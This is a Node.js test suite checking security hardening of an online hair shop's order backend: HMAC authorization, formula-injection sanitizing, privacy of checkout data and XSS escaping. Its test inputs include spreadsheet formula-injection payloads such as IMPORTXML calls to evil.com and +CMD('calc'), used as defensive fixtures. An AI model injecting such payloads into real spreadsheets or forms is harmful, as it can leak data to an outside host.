const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const vm = require('node:vm');
const crypto = require('node:crypto');

const codeSource = fs.readFileSync(require.resolve('../backend/Code.gs'), 'utf8');
const appSource = fs.readFileSync(require.resolve('../assets/js/app.js'), 'utf8');
const configSource = fs.readFileSync(require.resolve('../config.js'), 'utf8');
const { handleRequest } = require('../backend/stripe-worker.cjs');

function gasHarness(secret = 'test-gas-secret') {
  const sheets = {
    Orders: [
      ['Timestamp', 'Order', 'Customer', 'Email', 'Phone', 'Method', 'Items', 'Subtotal €', 'Shipping €', 'Total €', 'COGS €', 'Fee €', 'Profit €']
    ],
    Messages: [
      ['Timestamp', 'Name', 'Email', 'Phone', 'Comment']
    ],
    Subscribers: [
      ['Timestamp', 'Email']
    ],
    'Chatbot Log': [
      ['Timestamp', 'Session', 'Page', 'Question', 'Route', 'Tier', 'Reason', 'Matched Q&A', 'Transcript', 'Status', 'Owner answer', 'Add to KB', 'Reviewed']
    ]
  };

  const getSheet = name => {
    if (!sheets[name]) sheets[name] = [];
    const rows = sheets[name];
    return {
      getDataRange: () => ({ getValues: () => rows.map(r => r.slice()) }),
      appendRow: r => rows.push(r.slice()),
      getRange: (r, c) => ({
        setValue: v => { rows[r - 1][c - 1] = v; },
        setFontWeight: () => ({ setBackground: () => ({ setFontColor: () => {} }) })
      }),
      setFrozenRows: () => {}
    };
  };

  const mails = [];
  const context = {
    OWNER_EMAIL: 'owner@example.com',
    SHEET_NAME: 'Orders',
    ORDERS_HEADER: sheets.Orders[0],
    MSG_HEADER: sheets.Messages[0],
    CHAT_HEADER: sheets['Chatbot Log'][0],
    LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
    MailApp: { sendEmail: m => mails.push(m) },
    CacheService: { getScriptCache: () => ({ get: () => null, put() {} }) },
    Session: { getScriptTimeZone: () => 'UTC', getActiveUser: () => ({ getEmail: () => 'owner@example.com' }) },
    Utilities: {
      formatDate: () => '2026-10-23 12:00',
      computeDigest: (alg, val) => Buffer.from(crypto.createHash('sha256').update(String(val)).digest()),
      base64EncodeWebSafe: b => Buffer.from(b).toString('base64url'),
      computeHmacSha256Signature: (b, k) => Array.from(crypto.createHmac('sha256', k).update(b).digest()),
      DigestAlgorithm: { SHA_256: 'SHA_256' }
    },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: k => k === 'WORKER_GAS_SECRET' ? secret : null,
        setProperty: () => {}
      })
    },
    ContentService: {
      createTextOutput: content => ({
        setMimeType: () => JSON.parse(content)
      }),
      MimeType: { JSON: 'JSON' }
    },
    getSheet_: getSheet,
    getSpreadsheet_: () => ({
      getSheetByName: name => getSheet(name),
      insertSheet: name => getSheet(name),
      getId: () => 'mock-ss-id'
    }),
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getSheetByName: name => getSheet(name),
        insertSheet: name => getSheet(name),
        getId: () => 'mock-ss-id'
      })
    }
  };

  vm.createContext(context);
  vm.runInContext(codeSource, context);
  context.getSheet_ = getSheet;
  return { context, sheets, mails };
}

test('GAS authorization: direct unauthenticated POSTs are rejected and append no rows', () => {
  const { context, sheets, mails } = gasHarness();

  // Attacker attempting fake order injection
  const fakeOrder = {
    type: 'order',
    method: 'manual',
    customer: { name: 'Attacker Fake Order', email: 'attacker@evil.com' },
    items: [],
    totalEur: 99999
  };
  const res1 = context.doPost({ postData: { contents: JSON.stringify(fakeOrder) } });
  assert.equal(res1.ok, false);
  assert.equal(res1.error, 'Unauthorized request');
  assert.equal(sheets.Orders.length, 1); // Only header row
  assert.equal(mails.length, 0); // No quota exhaustion

  // Attacker attempting direct contact injection
  const fakeContact = { type: 'contact', name: 'Spammer', comment: 'Spam text' };
  const res2 = context.doPost({ postData: { contents: JSON.stringify(fakeContact) } });
  assert.equal(res2.ok, false);
  assert.equal(sheets.Messages.length, 1);

  // Attacker attempting direct chat_log injection
  const fakeChat = { type: 'chat_log', sessionId: 'AH-FAKE-01', question: 'DDoS' };
  const res3 = context.doPost({ postData: { contents: JSON.stringify(fakeChat) } });
  assert.equal(res3.ok, false);
  assert.equal(sheets['Chatbot Log'].length, 1);
});

test('GAS authorization: HMAC-signed Worker payloads are accepted and recorded', () => {
  const secret = 'worker-shared-secret';
  const { context, sheets, mails } = gasHarness(secret);

  const orderPayload = {
    action: 'manual_order',
    method: 'orange_money',
    totalEur: 120,
    subtotalEur: 100,
    shippingEur: 20,
    customer: { name: 'Legitimate Buyer', email: 'buyer@example.com', phone: '+24595000000' },
    items: [{ title: 'Crochet Hair', qty: 1, opts: { len: '16' } }],
    text: 'Legitimate Orange Money order.'
  };

  const raw = JSON.stringify(orderPayload);
  const signature = crypto.createHmac('sha256', secret).update(raw).digest('hex');
  const res = context.doPost({
    postData: { contents: JSON.stringify({ payload: raw, signature }) }
  });

  assert.equal(res.ok, true);
  assert.equal(res.saved, true);
  assert.equal(sheets.Orders.length, 2);
  assert.equal(sheets.Orders[1][2], 'Legitimate Buyer');
  assert.equal(mails.length, 1);
});

test('GAS formula injection: safeCell_ neutralizes spreadsheet formula prefixes', () => {
  const { context } = gasHarness();
  const payloads = [
    ['=SUM(1,2)', "'=SUM(1,2)"],
    ['=IMPORTXML("https://evil.com","//a")', "'=IMPORTXML(\"https://evil.com\",\"//a\")"],
    ['+CMD("calc")', "'+CMD(\"calc\")"],
    ['-1+2', "'-1+2"],
    ['@SUM(A1:B10)', "'@SUM(A1:B10)"],
    ['  =formula', "'=formula"],
    ['\t=cmd', "'=cmd"],
    ['\r\n=formula', "'=formula"],
    ['Normal text', 'Normal text'],
    ['123.45', '123.45'],
    [null, ''],
    [undefined, '']
  ];

  for (const [input, expected] of payloads) {
    const result = context.safeCell_(input, 100);
    assert.equal(result, expected, `Failed for input: ${input}`);
  }
});

test('GAS formula injection: buildOrderRow_ sanitizes all user-controlled customer strings', () => {
  const { context } = gasHarness();
  const maliciousOrder = {
    method: '=EVIL()',
    customer: {
      name: '=IMPORTXML("http://evil.com/leak")',
      email: '+hack@example.com',
      phone: '@call(123)'
    },
    items: [
      { title: '=FORMULA_IN_TITLE', qty: 1, opts: { opt1: '=OPTS' } }
    ],
    coupon: '=COUPON',
    fulfillmentMethod: 'delivery',
    totalEur: 100,
    subtotalEur: 80,
    shippingEur: 20
  };

  const row = context.buildOrderRow_(maliciousOrder);
  // row indices: [0:date, 1:orderNum, 2:name, 3:email, 4:phone, 5:method, 6:items, 7:subtotal, ...]
  assert.match(row[2], /^'=IMPORTXML/);
  assert.match(row[3], /^'\+hack@example\.com/);
  assert.match(row[4], /^'@call\(123\)/);
  assert.match(row[5], /^'=EVIL\(\)/);
  assert.match(row[6], /'=FORMULA_IN_TITLE/);
});

test('Client config: public config.js does not expose raw Google Apps Script backendURL', () => {
  const c = {};
  c.window = c;
  vm.createContext(c);
  vm.runInContext(configSource, c);
  assert.equal(c.CONFIG.backendURL, '', 'CONFIG.backendURL must be empty in public client config');
  assert.equal(c.CONFIG.subscribeURL, '/public/subscribe');
  assert.equal(c.CONFIG.chatLogURL, '/public/chat-log');
});

test('Privacy (AH-SEC-05): checkout draft is persisted in sessionStorage only and localStorage is purged', () => {
  const sessionData = new Map();
  const localData = new Map();

  const c = {
    sessionStorage: {
      getItem: k => sessionData.get(k) || null,
      setItem: (k, v) => sessionData.set(k, v),
      removeItem: k => sessionData.delete(k)
    },
    localStorage: {
      getItem: k => localData.get(k) || null,
      setItem: (k, v) => localData.set(k, v),
      removeItem: k => localData.delete(k)
    }
  };

  vm.createContext(c);
  const draftFns = appSource.slice(
    appSource.indexOf('const CHECKOUT_DRAFT_KEY'),
    appSource.indexOf('function renderCheckoutPage()')
  );
  vm.runInContext(draftFns, c);

  // Saving a draft must write to sessionStorage and never to localStorage
  c.saveCheckoutDraft({ first: 'Jane', email: 'jane@example.com' });
  assert.ok(sessionData.has('ash_checkout_draft'));
  assert.equal(localData.has('ash_checkout_draft'), false, 'localStorage must NOT hold customer PII');

  // If old draft exists in localStorage, loading migrates and purges it from localStorage
  sessionData.clear();
  localData.set('ash_checkout_draft', JSON.stringify({ first: 'OldDraft' }));
  const loaded = c.loadCheckoutDraft();
  assert.equal(loaded.first, 'OldDraft');
  assert.equal(localData.has('ash_checkout_draft'), false, 'Legacy localStorage draft must be purged');
});

test('XSS hardening (AH-SEC-06): product view escapes description DOM sink', () => {
  assert.match(appSource, /\$\{escapeHTML\(p\.description\)\}/, 'p.description must be escaped with escapeHTML');
  assert.doesNotMatch(appSource, /<p>\$\{p\.description\}<\/p>/, 'Raw unescaped p.description sink must not exist');
});

test('Privacy (AH-SEC-07): WhatsApp handoff minimizes residential street address', () => {
  const placeOrderSlice = appSource.slice(
    appSource.indexOf('function placeOrder(btn)'),
    appSource.indexOf('function showOrderConfirmation(')
  );
  assert.doesNotMatch(placeOrderSlice, /Morada: \$\{addressLine\}/);
  assert.match(placeOrderSlice, /morada completa registada no pedido/);
});

test('Worker edge: /public/csp-report endpoint handles reports with HTTP 204', async () => {
  const req = new Request('https://asheerahhair.com/public/csp-report', {
    method: 'POST',
    headers: { Origin: 'https://asheerahhair.com', 'Content-Type': 'application/csp-report' },
    body: JSON.stringify({ 'csp-report': { 'document-uri': 'https://asheerahhair.com/checkout.html' } })
  });
  const res = await handleRequest(req, { SITE_ORIGIN: 'https://asheerahhair.com' });
  assert.equal(res.status, 204);
});
